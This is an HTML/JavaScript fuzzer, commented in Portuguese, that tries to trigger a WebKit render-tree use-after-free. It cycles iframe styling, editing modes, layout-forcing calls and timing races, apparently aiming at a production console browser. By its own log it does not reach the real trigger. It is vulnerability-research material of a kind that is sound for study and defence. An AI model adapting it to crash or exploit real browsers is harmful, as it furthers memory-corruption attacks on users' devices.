
<!DOCTYPE html>
<!--
  Fuzzer para render-tree-as-text-uaf (commit 3f3fec2)
  Estratégia: cobrir variações de tudo que é fuzzável em JS,
  iterando combinações de condições. O trigger C++ permanece
  como gargalo — logado explicitamente quando tentado.
-->
<style>
  #i0 { content: url(); zoom: 0.01; }
</style>
<body>
<div id="log" style="font:12px monospace;white-space:pre;overflow:auto;height:300px;border:1px solid #ccc"></div>
<iframe id="i0" tabindex="0"></iframe>

<script>
const log = (msg) => {
  const el = document.getElementById('log');
  el.textContent += `[${Date.now()}] ${msg}\n`;
  el.scrollTop = el.scrollHeight;
  console.log(msg);
};

// ─── Variantes para internals.settings.setAsyncFrameScrollingEnabled ───────
const asyncScrollVariants = [
  {
    label: 'overflow:scroll (compositor layer)',
    apply: (iframe) => { iframe.style.overflow = 'scroll'; }
  },
  {
    label: 'willChange:transform (GPU layer)',
    apply: (iframe) => { iframe.style.willChange = 'transform'; }
  },
  {
    label: 'contain:strict (isolation layer)',
    apply: (iframe) => { iframe.style.contain = 'strict'; }
  },
  {
    label: 'translateZ(0) (force compositing)',
    apply: (iframe) => { iframe.style.transform = 'translateZ(0)'; }
  },
  {
    label: 'nenhum (baseline sem async scroll)',
    apply: (_) => {}
  },
];

// ─── Variantes para internals.settings.setCaretBrowsingEnabled ────────────
const caretVariants = [
  {
    label: 'designMode on (document)',
    apply: () => { try { document.designMode = 'on'; } catch(e) {} }
  },
  {
    label: 'contenteditable no body',
    apply: () => { document.body.contentEditable = 'true'; }
  },
  {
    label: 'nenhum (sem caret browsing)',
    apply: () => {}
  },
];

// ─── Variantes de trigger (substitutos para testRunner.dumpAsText) ─────────
// Nenhum percorre externalRepresentation() — logamos isso explicitamente.
// O objetivo é encontrar se algum aciona path alternativo de UAF.
const triggerVariants = [
  {
    label: 'offsetWidth sync layout (document root)',
    trigger: () => void document.documentElement.offsetWidth
  },
  {
    label: 'getBoundingClientRect (iframe)',
    trigger: () => void document.getElementById('i0').getBoundingClientRect()
  },
  {
    label: 'getComputedStyle zoom',
    trigger: () => void window.getComputedStyle(document.getElementById('i0')).zoom
  },
  {
    label: 'Range.selectNodeContents (força render tree para selection)',
    trigger: () => {
      try {
        const r = document.createRange();
        r.selectNodeContents(document.getElementById('i0'));
        window.getSelection().addRange(r);
      } catch(e) {}
    }
  },
  {
    label: 'scrollIntoView (força layout do frame)',
    trigger: () => {
      try { document.getElementById('i0').scrollIntoView(); } catch(e) {}
    }
  },
  {
    label: 'elementFromPoint (hit-test no RenderWidget)',
    trigger: () => {
      const r = document.getElementById('i0').getBoundingClientRect();
      document.elementFromPoint(r.left + 1, r.top + 1);
    }
  },
  {
    label: 'IntersectionObserver flush',
    trigger: () => {
      return new Promise(resolve => {
        const io = new IntersectionObserver((entries) => {
          io.disconnect();
          resolve();
        });
        io.observe(document.getElementById('i0'));
      });
    }
  },
  {
    label: 'requestAnimationFrame (layout pós-compositing)',
    trigger: () => new Promise(resolve => requestAnimationFrame(resolve))
  },
  {
    label: 'AVISO: testRunner.dumpAsText() — só funciona no CI',
    trigger: () => {
      if (window.testRunner) {
        log('  → testRunner disponível! Acionando dumpAsText()...');
        testRunner.dumpAsText();
      } else {
        log('  → testRunner ausente (esperado em produção/PS4)');
      }
    }
  },
  {
    label: 'AVISO: internals.externalRepresentation() — só em test builds',
    trigger: () => {
      if (window.internals) {
        try {
          log('  → internals disponível! Acionando externalRepresentation()...');
          internals.externalRepresentation(document.documentElement);
        } catch(e) {
          log(`  → internals presente mas erro: ${e.message}`);
        }
      } else {
        log('  → internals ausente (esperado em produção/PS4)');
      }
    }
  },
];

// ─── Sequência de timing para o focus/hash ───────────────────────────────
const timingVariants = [
  {
    label: 'Promise.resolve (microtask)',
    schedule: (fn) => Promise.resolve().then(fn)
  },
  {
    label: 'setTimeout(0) (macrotask)',
    schedule: (fn) => setTimeout(fn, 0)
  },
  {
    label: 'requestAnimationFrame',
    schedule: (fn) => requestAnimationFrame(fn)
  },
  {
    label: 'duplo Promise.resolve (microtask +1)',
    schedule: (fn) => Promise.resolve().then(() => Promise.resolve().then(fn))
  },
];

// ─── Engine do fuzzer ────────────────────────────────────────────────────
const DELAY_BETWEEN_ITERATIONS = 300; // ms
let iteration = 0;
let errors = 0;

function resetDOM() {
  // Remove frameset e recria iframe limpo para próxima iteração
  const old = document.querySelector('frameset');
  if (old) old.remove();

  const oldIframe = document.getElementById('i0');
  const newIframe = document.createElement('iframe');
  newIframe.id = 'i0';
  newIframe.tabIndex = 0;
  newIframe.style.cssText = 'content:url();zoom:0.01;';
  oldIframe.replaceWith(newIframe);

  // Reset hash sem trigger de evento
  history.replaceState(null, '', window.location.pathname);

  // Reset designMode/contentEditable
  try { document.designMode = 'off'; } catch(e) {}
  document.body.contentEditable = 'false';
}

async function runIteration(asyncScroll, caret, trigger, timing) {
  const label = `[iter ${iteration}] async=${asyncScroll.label} | caret=${caret.label} | trigger=${trigger.label} | timing=${timing.label}`;
  log(`\n▶ ${label}`);

  resetDOM();
  const iframe = document.getElementById('i0');

  // Aplica variantes de settings
  asyncScroll.apply(iframe);
  caret.apply();

  return new Promise((resolve) => {
    window.onload = null; // já estamos no onload, não re-registrar

    document.documentElement.append(document.createElement('frameset'));

    iframe.onfocus = () => {
      log('  → onfocus disparado');
      try {
        // Aqui: trigger acontece no momento de focus + hash change
        // para maximizar chance de race com layout
        const result = trigger.trigger();
        if (result && typeof result.then === 'function') {
          result.then(() => {
            location.hash = 'y';
          });
        } else {
          location.hash = 'y';
        }
      } catch(e) {
        log(`  ⚠ EXCEÇÃO em onfocus trigger: ${e.message}`);
        errors++;
      }
    };

    location.hash = 'x';

    timing.schedule(async () => {
      try {
        // Trigger também antes do focus (replica dumpAsText pre-focus)
        const pre = trigger.trigger();
        if (pre && typeof pre.then === 'function') await pre;

        iframe.focus();

        // Trigger novamente pós-focus (replica dumpAsText pós-hash)
        await new Promise(r => setTimeout(r, 50));
        const post = trigger.trigger();
        if (post && typeof post.then === 'function') await post;

        log(`  ✓ iteração completa`);
      } catch(e) {
        log(`  ⚠ EXCEÇÃO em timing schedule: ${e.message}`);
        errors++;
      } finally {
        resolve();
      }
    });
  });
}

async function fuzz() {
  const totalCombinacoes =
    asyncScrollVariants.length *
    caretVariants.length *
    triggerVariants.length *
    timingVariants.length;

  log(`Iniciando fuzzer: ${totalCombinacoes} combinações`);
  log(`AVISO: o trigger C++ (externalRepresentation) não é alcançável via JS puro.`);
  log(`Qualquer exceção inesperada pode indicar instabilidade adjacente ao bug.\n`);

  for (const asyncScroll of asyncScrollVariants) {
    for (const caret of caretVariants) {
      for (const trigger of triggerVariants) {
        for (const timing of timingVariants) {
          iteration++;
          try {
            await runIteration(asyncScroll, caret, trigger, timing);
          } catch(e) {
            log(`  ✖ ERRO NÃO CAPTURADO iter ${iteration}: ${e.message}`);
            errors++;
          }
          await new Promise(r => setTimeout(r, DELAY_BETWEEN_ITERATIONS));
        }
      }
    }
  }

  log(`\n═══ Fuzzer concluído ═══`);
  log(`Total iterações: ${iteration}`);
  log(`Exceções detectadas: ${errors}`);
  log(`\nPróximos passos:`);
  log(`  - Se errors > 0: inspecionar iterações com ⚠`);
  log(`  - Trigger C++ real: conectar Remote Inspector durante as iterações`);
  log(`    e acionar GetRenderTreeExternalRepresentation via protocolo WebKit`);
}

// Inicia após onload
window.addEventListener('load', () => setTimeout(fuzz, 100));
</script>
</body>
